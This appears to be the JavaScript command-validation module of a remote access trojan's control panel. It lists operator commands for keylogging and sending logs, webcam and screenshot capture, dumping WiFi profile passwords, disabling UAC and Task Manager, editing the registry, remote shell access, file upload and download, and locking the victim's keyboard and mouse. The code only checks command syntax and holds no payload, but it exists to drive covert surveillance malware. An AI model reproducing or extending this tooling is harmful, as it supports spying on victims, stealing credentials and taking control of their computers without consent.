// commands.js

// Define the valid commands directly in JavaScript
const validCommands = {
    'help': [],
    'start': ['<input>'],
    'stop': [],
    'status': [],
    'restart': ['<input>'],
    'connect': ['<input>'],
    'list': [],
    'tasklist': [],
    'screenshare': [],
    'disconnect': ['<input>'],
    'shell': [],
    'drivers': [],
    'setvalue': ['<HKEY>', '<path>', '<key>', '<value>'],
    'delkey': ['<HKEY>', '<path>'],
    'createkey': ['<HKEY>', '<path>'],
    'disableUAC': [],
    'reboot': [],
    'usbdrivers': [],
    'volumeup': [],
    'volumedown': [],
    'monitors': [],
    'kill': ['<process>'],
    'extendrights': [],
    'turnoffmon': [],
    'turnonmon': [],
    'setwallpaper': ['<filename>'],
    'keyscan_start': [],
    'send_logs': [],
    'stop_keylogger': [],
    'delfile': ['<filepath>'],
    'createfile': ['<filepath>'],
    'ipconfig': [],
    'writein': ['<text>'],
    'sendmessage': ['<text>', '<title>'],
    'profilepswd': ['<profile>'],
    'profiles': [],
    'cpu_cores': [],
    'cd': ['<directory>'],
    'dir': [],
    'portscan': [],
    'systeminfo': [],
    'localtime': [],
    'abspath': ['<file>'],
    'readfile': ['<file>'],
    'disable--keyboard': [],
    'disable--mouse': [],
    'disable--all': [],
    'enable--all': [],
    'enable--keyboard': [],
    'enable--mouse': [],
    'browser': ['<query>'],
    'cp': ['<source>', '<destination>'],
    'mv': ['<source>', '<destination>'],
    'editfile': ['<filepath>'],
    'mkdir': ['<directory>'],
    'rmdir': ['<directory>'],
    'searchfile': ['<filename>'],
    'curpid': [],
    'sysinfo': [],
    'pwd': [],
    'webcam': [],
    'breakstream': [],
    'startfile': ['<filepath>'],
    'download': ['<remote_file>'],
    'upload': ['<local_file>', '<remote_file>'],
    'disabletaskmgr': [],
    'enabletaskmgr': [],
    'isuseradmin': [],
    'screenshot': [],
    'webcam_snap': []
};

export const validateCommand = (command) => {
    const [baseCommand, ...args] = command.split(' ');
    if (!validCommands.hasOwnProperty(baseCommand)) {
        alert(`Invalid command: ${baseCommand}`);
        return false;
    }
    const requiredArgs = validCommands[baseCommand];
    if (requiredArgs.length > 0 && args.length < requiredArgs.length) {
        alert(`Command ${baseCommand} requires additional input: ${requiredArgs.slice(args.length).join(', ')}`);
        return false;
    }
    return true;
};

export const getValidCommands = () => {
    return validCommands;
};
